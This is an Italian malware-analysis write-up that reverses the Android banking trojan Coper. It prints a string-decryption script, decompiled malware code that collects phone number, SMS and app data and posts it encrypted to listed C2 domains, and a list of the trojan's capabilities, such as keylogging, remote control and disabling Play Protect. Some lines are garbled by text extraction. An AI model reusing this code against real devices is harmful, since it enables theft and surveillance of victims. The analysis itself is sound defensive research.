Character.digit(str.charAt(i + 1), 16));\n}\nreturn bArr;\n}\n}\n\n Si nota subito che si tratta di RC4 ed altrettanto immediato è possibile decifrarlo con Cyberchef.\n\n Con uno script python possiamo modificare i “sorgenti” per decifrare le stringhe. Dato che non tutte le chiamate a Class45a.method67a avvengono con uno string literal come parametro, l’approccio usato è quello di trovare tutte gli string literal che rappresentano numerali esadecimali con un numero pari di cifre, rimpiazzarli con il valore decifrato e poi sostituire una generica chiamata Class45a.method67a(X) con X . Il codice python realizzato per l’occasione è il seguente:\nimport re\nimport os\nimport binascii\ndef transform(path, cb):\nfor f in os.listdir(path):\nfullpath =\nos.path.join(path, f)\nif os.path.isdir(fullpath):\ntransform(fullpath, cb)\nelif fullpath.endswith(\".java\"):\nwith\nopen(fullpath, \"rb\") as g:\ndata = g.read()\ndata = cb(data)\nwith open(fullpath, \"wb\") as g:\ng.write(data)\n#Shitty RC4\nimplementation copied from the internet\ndef rc4(data, key):\nS = list(range(256))\nj = 0\nout = []\n#KSA Phase\nfor i in\nrange(256):\nj = (j + S[i] + ord( key[i % len(key)] )) % 256\nS[i], S[j] = S[j], S[i]\n#PRGA Phase\ni = j = 0\nfor char\nin data:\ni = ( i + 1 ) % 256\nj = ( j + S[i] ) % 256\nS[i], S[j] = S[j], S[i]\nout.append(char ^ S[(S[i] + S[j]) %\n256])\nreturn bytes(out)\ndef decrypt(s):\n#Not an hex string indeed\nif len(s) % 2 == 1:\nreturn s\nreturn\nrc4(binascii.unhexlify(s), \"FqCpR3UIB7Eelm7akFJ\") re1 = re.compile(br'\"([a-f0-9]{2,})\"')\nre2 =\nre.compile(br'Class45a\\.method67a\\((?:\\(String\\))?(.*?)\\)')\ndef decode_string(data):\ndata = re1.sub(lambda m: b'\"' +\ndecrypt(m.group(1)) + b'\"', data)\ndata = re2.sub(lambda m: m.group(1), data)\nreturn data #Use your path here\ntransform(\"sources\", decode_string)\n\n## Reversing: la fase locale\n\n#### Abbiamo ora a disposizione i sorgenti decompilati con:\n\n Le stringhe decifrate; Ogni entità (classe, metodo o campo) ha un nome univoco e a codice prefisso.\n\n Siamo nelle condizioni di iniziare l’operazione di reversing vero e proprio. Una volta compreso il comportamento e la funzione di un metodo o di un campo, questi sono rinominati con un nome utile (es: showBlackScreen ).\n\n Nella fase locale viene tenuto in considerazione solo il codice del metodo ed il codice “intorno”. È una fase certosina, spesso ci si ritrova a dover continuamente spostare l’attenzione da una funzione all’altra. La vera arma è la pazienza, perchè Coper utilizza 260 metodi, 71 classi e 156 campi.\n\n Alcuni metodi non sono decompilati correttamente e JADX ci offre un codice meno strutturato in questi casi:\n/* JADX WARNING: Removed duplicated region for block: B:16:? A[RETURN, SYNTHETIC] */\n/* JADX WARNING: Removed\nduplicated region for block: B:9:0x0028 */\n/* Code decompiled incorrectly, please refer to instructions dump. */\nprivate void method43a(android.content.Context r7) {\n/*\nr6 = this;\nr1 = 0\njava.lang.String r2 = \"acsb_task\"\njava.lang.String r3 = \"\"\njava.lang.String r0 = fddo.Class67a.method247a(r7, r2, r3)\njava.lang.String r4 =\n\"confirm_uninstall\"\nboolean r0 = r0.equals(r4)\nif (r0 == 0) goto L_0x001f\nr0 = 1\njava.lang.String r4 =\n\"last_uninstall_attempt\"\nr5 = 10\nboolean r4 = fddo.Class58a.method200a(r7, r4, r5, r1)\nif (r4 == 0) goto L_0x0020\nfddo.Class67a.method248a(r7, r2, r3)\nL_0x001f:\nr0 = r1\nL_0x0020:\nif (r0 != 0) goto L_0x0070\nboolean r0 =\nfddo.Class58a.method138a(r7)\nif (r0 != 0) goto L_0x0070\njava.lang.String r0 = \"uninstall_apps\"\njava.lang.String r0 =\nfddo.Class67a.method247a(r7, r0, r3)\nboolean r2 = r0.isEmpty()\nif (r2 != 0) goto L_0x0070\njava.lang.Integer r1 =\njava.lang.Integer.valueOf(r1)\njava.lang.String r2 = \"uninstall_delay\"\njava.lang.Integer r1 =\nfddo.Class67a.method246a(r7, r2, r1)\nint r1 = r1.intValue()\nr2 = 0\njava.lang.Long r2 = java.lang.Long.valueOf(r2)\njava.lang.String r3 = \"uptime\"\njava.lang.Long r2 = fddo.Class67a.method244a(r7, r3, r2)\nlong r2 = r2.longValue()\nlong\nr4 = (long) r1\nint r1 = (r2 > r4 ? 1 : (r2 == r4 ? 0 : -1))\nif (r1 <= 0) goto L_0x0070\njava.lang.StringBuilder r1 =\n\n```\n\n-----\n\n```\n  j g g () j g g p g pp pp ( )\nr1.append(r0)\njava.lang.String r1 = r1.toString()\njava.lang.String r2 = \">>p095g\"\nandroid.util.Log.i(r2, r1)\nmethod42a(r7, r0)\nL_0x0070:\nreturn\n*/\nthrow new UnsupportedOperationException(\"Method not decompiled:\ncom.leadendq.Class38a.method43a(android.content.Context):void\");\n}\n\n#### Reinterpretando il codice, l’esempio sopra diviene:\nprivate void uninstall(Context context) {\nif (SharedPrefs.getString(context, \"acsb_task\",\n\"\").equals(\"confirm_uninstall\") && Misc.hasElapsed(context, \"last_uninstall_attempt\", 10, 0)) {\nSharedPrefs.putString(context, \"acsb_task\", \"\"); return;\n}\nif (Misc.isLockscreenOn(context))\nreturn;\nString\ntoUninstall = SharedPrefs.getString(context, \"uninstall_apps\", \"\");\nif (toUninstall.isEmpty())\nreturn;\nlong\nuninstallDelay = SharedPrefs.getInt(context, \"uninstall_delay\", Integer.valueOf(0)).intValue();\nlong uptime =\nSharedPrefs.getInt(context, \"uptime\", Integer.valueOf(0)).intValue();\nif (uptime < uninstallDelay)\nreturn;\nLog.i(\">>p095g\", \"p095g start uninstall apps: \" + toUninstall);\nuninstallOtherAdmins(context, toUninstall);\n}\n\n Lo strumento jrename in output fornisce una mappa di renaming. Quando salvata in un file insieme ai file .java decompilati, l’operazione di Trova/Sostituisci rinominerà automatica i nomi anche nel file di mapping. Questo verrà comodo per mappare i nomi del manifest nei nomi finali scelti dall’analista.\n\n Alla fine della fase locale di reversing si ha un insieme di sorgenti decompilati che assomigliano al codice sorgente originale. A questo punto è possible passare alla fase globale.\n\n## Reversing: la fase globale\n\n#### Una volta determinato il compito di ogni metodo, classe (e volendo di ogni campo) è necessario vedere come interagiscono tra di loro. Questa è la fase globale del reversing, quella in cui si guarda il malware dall’alto e si connettono i punti.\n\n Iniziamo dai punti di ingresso. Per un malware Android i punti di ingresso sono vari perchè ogni app Android espone più componenti.\n\n Analizzando il file manifest vediamo che sono presenti i seguenti componenti:\ncom.leadendq.p022e (Main) => MainActivity *\ncom.leadendq.p086c (Admin receiver) => AdminRec com.leadendq.p064y (SMS\nreceiver) => SMSStealer *\ncom.leadendq.p058q (SMS deliver) => NullReceiver1\ncom.leadendq.p032o (WAP push deliver) =>\nNullReceiver2 com.leadendq.p036z (SMS manager) => NullClickListenerActivity com.leadendq.p028m (Respond via SMS) =>\nNullService1 com.leadendq.p015a (Receiver) => PingReceiver\ncom.leadendq.p041o (All receiver) => RepeatedPingReceiver\n* com.leadendq.p038x (service) => ForegroundService\ncom.leadendq.p095g (service) => Bot\ncom.leadendq.LogSrv (service)\n=> com.leadendq.p027j (service) => DecoyMessage\ncom.leadendq.p084n (service) => ScreenStreamService\ncom.leadendq.p020e (service) => SendScreenshotSrv\ncom.leadendq.p081h (Accessibility service) => ACSBService\ncom.leadendq.p025n (Notification listener) => NotificationStealerBlocker\ncom.leadendq.p061e (receiver) =>\nNullReceiver6\ncom.leadendq.p043c (receiver) => NullReceiver3\ncom.leadendq.p049d (receiver) => NullReceiver4\ncom.leadendq.p077n (receiver) => NullActivity3\ncom.leadendq.p058z (receiver) => NullActivity\ncom.leadendq.p059z\n(receiver) => NullActivity2\ncom.leadendq.p012q (receiver) => NullService2\ncom.leadendq.p055u (receiver) =>\nNullService3\ncom.leadendq.p092f (receiver) => NullService7\n\n I componenti marcati con un asterisco sono quelli che possono fungere da punto di ingresso dell’applicazione appena installata. Successivamente, con l’intervento utente (o automaticamente) acquisirà altri punti di ingresso.\n\n In questa fase di analisi risulta utile realizzare degli schemi che indichino le interazioni tra i componenti. Per necessità di semplificazione questi schemi non potranno includere tutti i dettagli (i quali si possono trovare nel codice, che rimane la fonte ultima di riferimento).\n\n### Schema dei punti di ingresso\n\n#### Nello schema sotto abbiamo messo a sinistra i punti di ingresso del malware, ovvero l’activity principale, la ricezione di un SMS ed un receiver configurato per ricevere un ampio parco di eventi (boot, presenza dell’utente, blocco/sblocco dello schermo, installazione/rimozione app, risveglio dalla modalità doze, ricezione SMS).\n\n```\n\n-----\n\n#### Come avviene per moltissimi malware per Android, anche Coper usa le SharedPreferences come fulcro centrale di coordinamento. In queste sono salvati vari valori che orchestrano componenti altrimenti separati, sotto forniamo una tabella con i vari valori. Il nome del file usato per le SharedPreferences è “main“.\n\n Il cuore del malware si basa, come sempre, su un servizio di accessibilità malevolo e fa leva sulle numerose funzionalità di Android.\n\n### Gli entry-point\n\n#### Un primo entry-point, quello più semplice, è legato al receiver SMSStealer, configurato per essere chiamato quando viene ricevuto un SMS (supposto che l’utente fornisca i permessi o che l’app se li prenda una volta impostato il servizio di accessibilità).\n\n Quando viene ricevuto un nuovo SMS, Coper lo serializza in un oggetto JSON e:\n\n 1. lo aggiunge alle SharedPreferences sotto la voce “new_sms” (questo valore viene inviato ad ogni ping); 2. lo invia subito al C2.\n\n Come si vede c’è un po’ di ridondanza poichè il C2 può ricevere lo stesso SMS due volte. In generale, il C2 può rispondere di rimuovere un SMS dalla lista in “new_sms“, probabilmente a seguito della sua corretta ricezione. L’invio immediato è fatto probabilmente per ridurre la latenza: il ping infatti avviene ogni 60 secondi.\n\n L’altro entry-point è il receiver RepeatedPingReceiver. Questo è chiamato a seguito di vari eventi (si faccia riferimento al manifest) inclusi:\n\n boot presenza utente blocco/sblocco schermo ricezione SMS uscita dal doze mode installazione/rimozione app cambio connettività.\n\n\n-----\n\n#### co p to d questo ece e è a a e c c o d g de a a e e so C\n\n Il ciclo è effettuato con una sveglia (alarm) ripetuta ogni 60 secondi ed in grado di svegliare il telefono (RTC_WAKE):\n```\nif (repeating)\n{\nAlarmManager alarm = (AlarmManager)context.getSystemService(\"alarm\");\nPendingIntent intent =\nPendingIntent.getBroadcast(context, 0, new Intent(context, PingReceiver.class), 0);\nalarm.setRepeating(0,\nSystem.currentTimeMillis(), 60000, intent);\n}\n\n Il ping invia al C2 una serie di dati che analizzeremo meglio in seguito. Nelle SharedPreferences è presente il valore “is_registered” che è usato per determinare se il bot ha già effettuato la registrazione con il C2, ovvero se ha già effettuato un ping. Il primo Ping differisce, come informazioni dai successivi.\n\n Oltre all’avvio del ciclo di Ping, il receiver lancia anche il servizio Bot che ha lo scopo di eseguire alcuni comandi ricevuti dal C2.\n\n### L’Activity principale\n\n#### Infine, c’è l’Activity principale. Stranamente questa activity non necessariamente cerca di far installare il servizio di accessibilità all’utente.\n\n Per prima cosa salva il nome del proprio package nelle SharedPreferences, questo verrà usato in seguito per nasconderne l’icona se richiesto, a conferma del fatto che l’activity non è fondamentale.\n\n Il codice dell’activity prosegue effettuando un’operazione particolare: richiama infatti Misc.registerAllIntents\npublic static void registerAllIntents(Context context) {\nIntent intent = new Intent();\nfor (Field field :\nintent.getClass().getDeclaredFields()) {\nint modifiers = field.getModifiers();\nif (Modifier.isPublic(modifiers) &&\nModifier.isStatic(modifiers) && Modifier.isFinal(modifiers) && field.getType().equals(String.class)) {\ntry {\ncontext.registerReceiver(new RepeatedPingReceiver(), new IntentFilter((String) field.get(intent)));\n} catch\n(Exception e) {\nregisterMainReceiver(context);\nreturn;\n}\n}\n}\n}\n\n Questo metodo tenta di registrare RepeatedPingReceiver (già descritto sopra) con ogni possibile evento disponibile. Questo assicura al malware l’esecuzione del ciclo di ping in ogni condizione (notare che il codice di Misc.startPinging può essere chiamato n volte perchè un servizio in esecuzione non viene fatto ripartire da Android e perchè l’impostazione della sveglia cancella quella precedente).\n\n Solo se opportunamente configurato, viene tentato di indurre l’utente ad installare il servizio di accessibilità:\nif (SharedPrefs.getBool(applicationContext, \"show_acsb\", Boolean.FALSE).booleanValue()) {\nIntent intent = new\nIntent(applicationContext, ShowACSBSettingsOrUnlockScreen.class);\nintent.addFlags(268435456);\napplicationContext.startActivity(intent);\nreturn;\n}\n\n Di default “show_acsb” è impostato a false, poichè il file delle preferenze è vuoto inizialmente.\n\n## Perchè non viene richiesto di installare un servizio di accessibilità?\n\n#### Anche se l’utente non è indotto a compiere questa installazione, Coper avvia comunque il ciclo di Ping ed il servizio di Bot. Avviene quindi una comunicazione con il C2 dove:\n\n Nel primo ping (di registrazione) sono inviate varie informazioni sul dispositivo, tra cui lingua e paese. Il C2 può, nella sua risposta, indicare di indurre l’utente ad installare il servizio di accessibilità.\n\n Considerando che uno dei comandi inviabili dal C2 è “kill_bot“, per la rimozione del malware, è ipotizzabile che Coper non installi il servizio di accessibilità finchè il C2 non ha opportunamente verificato la nazionalità della vittima. Questo modo di fare non è nuovo: l’aver spostato il controllo lato server impedisce agli analisti di fare attribuzione basata sui paesi immuni.\n\n## Il Ciclo di Ping e Bot\n\n#### Il diagramma pubblicato prima è molto generico. Per capire come funziona Coper è necessario focalizzarsi sul ciclo di Ping e la classe Bot. Lo schema qui sotto espone meglio le interazioni di questi componenti:\n\n```\n\n-----\n\n#### La classe che si occupa di comunicare con il C2 è Net. Questa ha un metodo statico (Net.makeRequest) che ha il compito di inviare al C2 un ping.\n\n Il codice è strutturato in modo che le istanze di Net prendano come parametro del costruttore un payload json, al quale sono aggiunte una serie di proprietà e poi il tutto è inviato al C2. In questo modo, la classe può inviare non sono ping ma anche richieste differenti (ad esempio gli SMS ricevuti) pur mantenendo uno schema di base.\n\n Per generare il payload del primo ping viene usato il seguente metodo:\n```\npublic static JSONObject makeUnregisteredRequest(Context context) {\nJSONObject jSONObject = new JSONObject();\ntry {\njSONObject.put(\"xc\", \"bR\");\njSONObject.put(\"tA\", Misc.getDeviceID(context));\njSONObject.put(\"tB\",\nMisc.getPhoneNumber(context));\njSONObject.put(\"tC\", Misc.getCountry(context));\njSONObject.put(\"tD\",\nMisc.getLanguage(context));\njSONObject.put(\"tE\", Misc.getBuildRelease());\njSONObject.put(\"tF\",\nMisc.getDeviceModel());\njSONObject.put(\"tG\", Misc.getPhoneOperator(context));\njSONObject.put(\"lA\",\nMisc.getSystemApps(context));\nreturn jSONObject;\n} catch (JSONException e) {\ne.printStackTrace();\nreturn null;\n}\n}\n\n Come si può notare, al C2 sono inviati tra l’altro:\n\n Numero di telefono Paese e lingua del dispositivo Nome dell’operatore Applicazioni di sistema installate\n\n Questo permette al C2 di decidere quale comando inviare in base alla nazionalità della vittima.\n\n I ping successivi usano il seguente payload:\npublic static JSONObject makeRegisteredRequest(Context context, String[] tasks) {\nJSONObject jSONObject = new\nJSONObject();\ntry {\njSONObject.put(\"xc\", \"bP\");\nString getDeviceID = Misc.getDeviceID(context);\nif\n(!getDeviceID.isEmpty()) {\njSONObject.put(\"tA\", getDeviceID);\n}\nString getPhoneNumber = Misc.getPhoneNumber(context);\nif (!getPhoneNumber.isEmpty()) {\njSONObject.put(\"tB\", getPhoneNumber);\n}\nif (Misc.hasElapsed(context,\n\"last_applist_update\", 600)) {\nLog.i(TAG, \"Updating installed apps list\");\nString getString =\nSharedPrefs.getString(context, \"installed_pkgs\", \"\");\nString getInstalledApps = Misc.getInstalledApps(context);\nif\n(!getInstalledApps.isEmpty() && !getString.equals(getInstalledApps)) {\nSharedPrefs.putString(context,\n\n```\n\n-----\n\n```\n       p g, g pp ); j j p (, g pp ); p (,\n\"bot_smarts_ver\", -1);\n}\n}\nJSONArray taskIdsAndTrs = new JSONArray();\nfor (String theTask : tasks) {\nJSONObject\ntaskObj = new JSONObject(theTask);\nString taskId1 = taskObj.getString(\"tid1\");\nString taskTr_inner =\ntaskObj.getString(\"tr_inner\");\nif (taskId1 != null && !taskId1.isEmpty()) {\nif (!taskId1.equals(\"0\")) {\nStringBuilder\nsb = new StringBuilder();\nsb.append(taskId1);\nsb.append(\":\");\nsb.append(taskTr_inner);\ntaskIdsAndTrs.put(sb.toString());\n}\n}\n}\njSONObject.put(\"rZ\", taskIdsAndTrs);\nString getString2 =\nSharedPrefs.getString(context, \"new_sms\", \"\");\nif (getString2.isEmpty()) {\nreturn jSONObject;\n}\njSONObject.put(\"nS\",\ngetString2);\nreturn jSONObject;\n} catch (JSONException e) {\ne.printStackTrace();\nreturn null;\n}\n}\n\n#### Sono presenti meno informazioni e, in particolare, troviamo (oltre ad alcune info già viste):\n\n Gli SMS ricevuti e salvati (e non ancora rimossi secondo ordine del C2). Le app installate (ma solo ogni 10 minuti). I task ed i relativi risultati eseguiti (i task sono descritti in seguito).\n\n Dato un payload JSON da inviare (sia di registrazione, di ping, di errore o altro) questo viene passato ad una nuova instanza di Net. Net eredita da AsyncTask per cui è eseguibile in background in un executor: il metodo onBackground tenta l’invio 5 volte con una pausa di 5 secondi tra ogni tentativo.\n\n Ogni tentativo di invio usa Net.doPing il quale ha due compiti:\n\n 1. aumentare il payload con informazioni standard; 2. effettuare l’effettiva richiesta HTTP e creare un oggetto Response con la risposta ottenuta avendo cura di gestire eventuali errori.\n\n### Informazioni standard aggiunte ad ogni payload\nthis.payload.put(\"lB\", Config.UNKNOWN1);\nif (!Config.applicationTitle.isEmpty()) {\nthis.payload.put(\"lL\",\nMisc.hasPackage(this.context, Config.applicationTitle) ? \"1\" : \"0\");\n}\nthis.payload.put(\"bI\",\nMisc.makeBotID(this.context));\nthis.payload.put(\"iA\", Misc.isAppTheSMSManager(this.context) ? \"1\" : \"0\");\nthis.payload.put(\"dA\", SharedPrefs.getBool(this.context, \"device_admin_set\", Boolean.FALSE).booleanValue() ? \"1\" :\n\"0\");\nthis.payload.put(\"lK\", SharedPrefs.getBool(this.context, \"lock_on\", bool).booleanValue() ? \"1\" : \"0\");\ntry {\nString acsbStatus = Misc.isACSBInstalled(this.context) ? \"1\" : \"0\";\nif (Misc.isACSBInstalled(this.context) &&\nACSBService.instance == null) {\nacsbStatus = \"2\";\n}\nthis.payload.put(\"iAc\", acsbStatus);\nthis.payload.put(\"iPa\",\nMisc.isNotificationListenerInstalled(this.context).booleanValue() ? \"1\" : \"0\");\nthis.payload.put(\"iBC\",\nMisc.getBatteryLevel(this.context));\nthis.payload.put(\"iCP\", Misc.isDevicePlugged(this.context) ? \"1\" : \"0\");\nthis.payload.put(\"iSE\", !Misc.isLockscreenOn(this.context) ? \"1\" : \"0\");\nthis.payload.put(\"iSp\",\nSharedPrefs.getInt(this.context, \"check_perms_attempts\", 0));\nthis.payload.put(\"iFp\",\nSharedPrefs.getString(this.context, \"perms_failed\", \"\"));\nthis.payload.put(\"cTsk\",\nSharedPrefs.getString(this.context, \"acsb_task\", \"\"));\n} catch (Exception e) {\nLog.e(TAG, \"Net extra params\nexception: \" + e.getMessage());\ne.printStackTrace();\n}\nthis.payload.put(\"up\", SharedPrefs.getLong(this.context,\n\"uptime\", 0L));\nthis.payload.put(\"kL\", SharedPrefs.getBool(this.context, \"keylogger_enabled\",\nBoolean.FALSE).booleanValue() ? \"1\" : \"0\");\nthis.payload.put(\"vnc\", makeVNCString());\nthis.payload.put(\"fgM\",\nSharedPrefs.getBool(this.context, \"fg_mode\", Boolean.FALSE).booleanValue() ? \"1\" : \"0\");\nthis.payload.put(\"iAg\",\nMisc.isLowRAM(this.context));\nString realIP = SharedPrefs.getString(this.context, \"real_ip\", \"\");\nif\n(!realIP.isEmpty()) {\nthis.payload.put(\"rIP\", realIP);\n}\n\n#### Di seguito un elenco delle informazioni condivise:\n\n Nome dell’applicazione. Questo è un nome configurabile, può aiutare a censire la campagna lato attaccanti. L’ID del bot. L’ID del bot e del device differiscono. Il secondo è l’IMEI se disponibile, altrimenti l’ANDROID_ID, mentre il primo è un valore derivato dalle caratteristiche hardware del dispositivo. Entrambi variano al variare del telefono quindi non è chiara la distinzione. Se l’app può gestire gli SMS. Se l’app è tra le app admin. Se è attivo i locking del dispositivo fatto dal malware. Se e come il servizio di accessibilità è installato. Questo permette di farlo installare o rimuovere. Se l’app può ricevere le notifiche di altre app. Il livello della batteria e se è connesso al caricatore. Se il cellulare ha lo schermo bloccato (la normale funzionalità di blocco schermo). Se l’app ha ricevuto i permessi necessari al malware. Se c’è un task da eseguire per il servizio di accessibilità. Da quanto tempo il bot è registrato. Se il keylogger è attivo. La configurazione del servizio VNC (usato per simulare desktop remoto). Se il bot è eseguito come servizio foreground (visibile all’utente ma non interrompibile). Se il dispositivo ha poca RAM. L’IP esterno del dispositivo.\n\n```\n\n-----\n\n#### utte queste o a o o sco o u a pa o a ca ge e a e su d spos t o etto e s cu a e te a d a o ad agg o a e u a e abo ata dashboard.\n\n Una volta costruito il JSON finale, questo viene inviato all’ultimo dominio funzionante usato o, la prima volta, al primo valido.\n\n## La comunicazione con il C2\n\n#### Di seguito il codice con i domini censiti nella classe Config insieme ad altri parametri individuati in questo campione:\n```\npublic static final String domains =\n\"https://ssgsjhfsdfdsjhd.info/MzYzMzJjZDI5YzYx/|https://vvjfsdsdghsdghfvffdf.top/MzYzMzJjZDI5YzYx/|https://dfdfdfdgdffjd\npublic static final String applicationTitle = RC4.identity(\"\");\npublic static final String UNKNOWN1 = \"DONOTFILTER\";\npublic static final String IPAPIUrl = \"http://www.ip-api.com/json\";\npublic static final String customHeaderName =\n\"Packets-sent\";\n\n Net.doPing si occupa di trovare un dominio valido facendo uso di Net.doHTTPPost che è il vero metodo che effettua la connessione HTTP al C2.\n\n Questo è l’estratto del codice rilevante di quel metodo:\nHttpPost httpPost = new HttpPost(domain);\nhttpPost.setHeader(Config.customHeaderName, Config.customHeaderValue);\nString jSONObject2 = payload.toString();\nString encryptPacketPayload = Misc.encryptPacketPayload(jSONObject2);\nif\n(encryptPacketPayload == null) {\nencryptPacketPayload = jSONObject2;\n}\nbyte[] bytes =\nencryptPacketPayload.getBytes(\"UTF-8\");\nhttpPost.setHeader(\"Content-Encoding\", \"gzip\");\nByteArrayOutputStream\nbyteArrayOutputStream = new ByteArrayOutputStream();\nMaxGZIPOutputStream class64a = new\nMaxGZIPOutputStream(byteArrayOutputStream);\nclass64a.write(bytes);\nclass64a.close();\nByteArrayEntity byteArrayEntity\n= new ByteArrayEntity(byteArrayOutputStream.toByteArray());\nbyteArrayEntity.setContentEncoding(\"gzip\");\nhttpPost.setEntity(byteArrayEntity);\n\n Da notare che:\n\n Viene usato un header custom. Questo sample usa: Packets-sent: 60170 Il JSON è serializzato in una stringa. La stringa è cifrata. La cifratura è in Misc.encryptPacketPayload ma brevemente: Viene usato AES-ECB-128 con padding PKCS5. La chiave è il valore dell’header custom (60170) dopo che ne viene preso l’MD5 e convertito in esadecimale. Il risultato è codificato in base64. La stringa viene compressa con GZIP, livello massimo (9). Anche se comprimere dopo aver cifrato non ha molto senso. Il risultato è inviato come corpo della richiesta POST.\n\n L’operazione di cifratura è la seguente:\nmd5sum(string):\n\n  return to_hex(md5(string)); //to_hex non aggiunge prefissi 0x\n\ncifra(payload):\n\n  return to_base64(AES_encrypt(mode = ECB, padding = PKCS5, key = md5sum(Config.customHeaderValue), message =\njson_to_string(payload)));\n\n Se l’operazione va a buon fine, viene letta la risposta. Questa passa per un processo di decifratura che è inverso a quello usato per l’invio. Non viene però effettuato il decoding JSON poichè la stringa ottenuta è passata alla classe Response che si occuperà di processare la risposta.\n\n La classe Response effettua due tipi di azioni:\n\n 1. modifica le SharedPreference, orchestrando quindi altri componenti del malware; 2. esegue dei task.\n\n La nomenclatura di Coper è un po’ confusionaria ma in generale le funzionalità si possono dividere in:\n\n Interazioni. Solo per operazioni che fanno interagire il malware con l’utente (es: gli inject) o con il dispositivo (es: dandosi i permessi automaticamente). VNC. E’ una riproduzione di un desktop remoto. Comprende streaming, screenshot e task appositi. VNC task. Sono operazioni a supporto del desktop remoto e simulano l’interazione dell’utente con il dispositivo. Task. Sono operazioni richieste dal C2 che non rientrano nelle categorie precedenti. ACSB task. Questa è l’operazione che il servizio di accessibilità deve compiere in virtù dell’utente (ad esempio disabilitare Play Protect). Non è un task dato dal C2 ma è conseguenza delle azioni richieste da quest’ultimo. Viene impostato dalla classe Bot ed eseguito dalla classe ACSBService (il servizio di accessibilità).\n\n Il codice di riferimento si trova in Response.initResponse.\n\n```\n\n-----\n\n### a sposta de C è u JSO\n\n#### Le principale funzionalità sono:\n\n Possibili domini C2 extra. Codice HTML degli inject da usare. Abilitazione e disabilitazione inject. Abilitazione e disabilitazione keylogger. App da disinstallare. App di cui impedire l’utilizzo (simulando la pressione del tasto home). App di cui bloccare le notifiche. Vari delay per specifiche funzionalità (es: per gli inject). Può effettuare chiamate a numeri arbitrari. Può inviare SMS arbitrari. Ha un funzionalità di auto test (vedi dopo). Abilitazione intercettazione notifiche. Blocco software del telefono (e relativo sblocco). Questa è la classica funzionalità per impedire l’utilizzo del telefono. Viene disattivato l’audio, la luminosità ridotta al minimo (se possibile) e mostrata un overlay (o una webview se non possibile) nera che oscura il contenuto dello schermo. Può mostrare notifiche arbitrarie per aprire app arbitrarie. Può disinstallarsi. Può abilitare la funzionalità VNC per fare streaming dello schermo, screenshot, silenziare il telefono, cambiare la luminosità, cambiare il timeout per il blocco schermo a mezz’ora. Può simulare l’interazione dell’utente sullo schermo (tap, tap lunghi, gesture, copia-incolla, pressione tasti fisici, swipe)\n\n## I task\n\n#### I task sono salvati in un file di nome .q<package malware> nella directory dell’applicazione. In formato JSON.\n\n I task ed i task VNC sono eseguiti direttamente da Response. Mentre le Interazioni e la funzionalità VNC è eseguita dalla classe Bot. L’ACSB task è ovviamente eseguito dal servizio di accessibilità ma su richiesta della classe Bot.\n\n Questa classe è eseguita insieme al Ping e finisce per eseguire un ciclo in cui le SharedPreferences sono lette per verificare quale azione compiere (Bot.mainLoop).\n\n Coper si preoccupa di acquisire un WakeLock per evitare la sospensione del bot (fintanto che non si sarà messo nella whitelist dell’ottimizzazione batteria).\n\n Il bot si occupa inoltre di aggiornare l’uptime salvato nelle SharedPreferences, di verificare la presenza di nuovi Inject da scaricare, di ottenere le informazioni relative all’IP esterno del dispositivo (tramite un servizio di IP info in Config.IPAPIUrl, nello specifico http://www.ip- api.com/json) e di fare un nuovo ping al C2.\n\n## Se il servizio di accessibilità è installato\n\n#### Qualora il servizio di accessibilità sia installato, vengono effettuate anche le seguenti operazioni (in un ciclo):\n\n Parsa il comando “vnc” per impostare vari valori nelle SharedPreferences al fine di coordinare il servizio di accessibilità ed i servizi di screenshot e streaming. Inoltre disabilita notifiche, luminosità e suono se richiesto. L’intento è quello di operare sul dispositivo della vittima senza farsi notare. Se non è attivo il comando “vnc”, fa eseguire al servizio di accessibilità l’ACSB task se presente. Se “vnc” non è attivo, invia i dati del keylogger (salvati in un file kl.txt nella directory dell’app) al C2. Se “vnc” non è attivo, blocca il dispositivo (come indicato sopra) se richiesto. Se “vnc” non è attivo, prova ad impostarsi come gestore SMS. Se “vnc” non è attivo, prova a mettersi in whitelist per l’ottimizzazione batteria. Se “vnc” non è attivo, prova ad impostarsi come Device Admin e rimuovere le altre app Device admin. Se “vnc” non è attivo, prova a disabilitare Play Protect (servizio di protezione di Google). Se “vnc” non è attivo, prova ad impostarsi su Xiomi Autostart. Se “vnc” non è attivo, prova ad ottenere il permesso per scrivere le impostazioni di sistema. Se “vnc” non è attivo, prova ad ottenere automaticamente i permessi di cui ha bisogno (descritti ad inizio articolo).\n\n## Se il servizio di accessibilità NON è installato\n\n#### Qualora il servizio di accessibilità non sia installato, viene fatta partire una finestra di decoy per indurre l’utente ad installarlo. Una volta installato, cancella le notifiche (per non destare sospetti nell’utente) e cancella la propria icona dalla home (nei dispositivi dove questo è possibile). Così facendo il malware diviene “invisibile” per l’utente.\n\n\n-----\n\n#### decoy co s ste due co po e t\n\n 1. una finestra opzionale contenente una WebView e che mostra il codice HTML in Config.HTMLs; 2. un messaggio Toast che induce l’utente ad abilitare il servizio.\n\n È interessante notare che, una volta abilitato il servizio di accessibilità, l’utente è riportato alla home perchè lo stesso servizio impedisce di riaccedere alle impostazioni di accessibilità.\n\n L’HTML di decoy usato ha questa forma nel sample analizzato:\n\n Il Toast mostrato è generato con questo codice:\n```\nMisc.showToast(getApplicationContext(), (Misc.isXIOMI() ? \"Apri Servizi scaricati; Enable %APP% service\" :\nMisc.isSamsung() ? \"Apri Servizi installati; Abilitare %APP% servizio\" : \"Abilitare %APP% servizio\").replace(\"%APP%\",\nMisc.getFullAppLabel(this)));\n\n Una volta installato, il servizio di accessibilità può eseguire dei task in automatico (oltre che funzione da keylogger e streamer per il servizio VNC).\n\n Il codice per eseguire questi nuovi task si trova in ACSBService.doAcsbJob (con l’aiuto della classe Lay), questi includono:\n\n```\n\n-----\n\n#### a e og app c e co t e e o e de a a e (s te de o e tt o de a a e) Questo ped sce a d s sta a o e o operazioni di verifica. Abilitare l’utilizzo di TeamViewer se presente. Impostare l’app come gestore SMS. Disabilitare Play Protect. Disinstallare un’app. Impostarsi in whitelist per la batteria. Impostarsi in Xiomi Autostart. Impostarsi come ricevitore di notifiche. Impostarsi come Device Admin. Concedersi i permessi di cui necessita. Concedersi il permesso di scrivere le impostazioni di sistema. Concedersi il permesso di creare finestre overlay (sopra ogni altra finestra). Escludersi dalle statistiche di utilizzo. Eseguire un comando “vnc_screen” per darsi il permesso di fare streaming dello schermo (Tramite la classe ScreenshotPermissionGranted).\n\n## I nuovi entry-point\n\n#### Analizziamo i nuovi entry-point che il core può abilitare. Si tratta della ricezione di un evento di accessibilità, di una notifica e della gestione dello stato di Device Admin.\n\n\n-----\n\n#### AdminRec è il receiver che gestisce lo stato di Admin. Il suo codice è molto semplice ma anche qui Coper usa messaggi fuorvianti per indurre la vittima a non disabilitare lo stato di Admin (cosa che comunque non è possibile quando 